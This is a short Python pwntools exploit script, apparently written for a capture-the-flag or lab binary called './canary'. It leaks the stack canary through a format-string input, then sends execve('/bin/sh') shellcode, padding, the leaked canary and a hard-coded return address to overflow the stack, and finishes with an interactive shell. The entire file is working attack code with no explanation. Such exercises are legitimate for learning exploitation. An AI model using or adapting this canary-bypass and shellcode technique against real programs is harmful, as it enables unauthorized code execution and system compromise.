#!/usr/bin/python

import pwn

shellcode = (
    b"\x50\x48\x31\xd2\x48\x31\xf6\x48"
    + b"\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
    + b"\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
)

padding = b"a" * 8

target =  0x7fffffffdb58
format_str = b"%11$p_foo"

leak_can_str = padding + format_str

pty = pwn.process.PTY
p = pwn.process("./canary", stdin=pty, stdout=pty)

p.sendline(leak_can_str)

can = p.recvuntil(b"_foo")
print(can)

can = can.decode()

can = can.split("_")[0]
print(can)

canary = pwn.p64(int(can, 16))
print(canary)


payload = shellcode + b"a" * 8 + canary + b"a" * 8 + pwn.p64(target)


p.sendline(payload)
p.interactive()
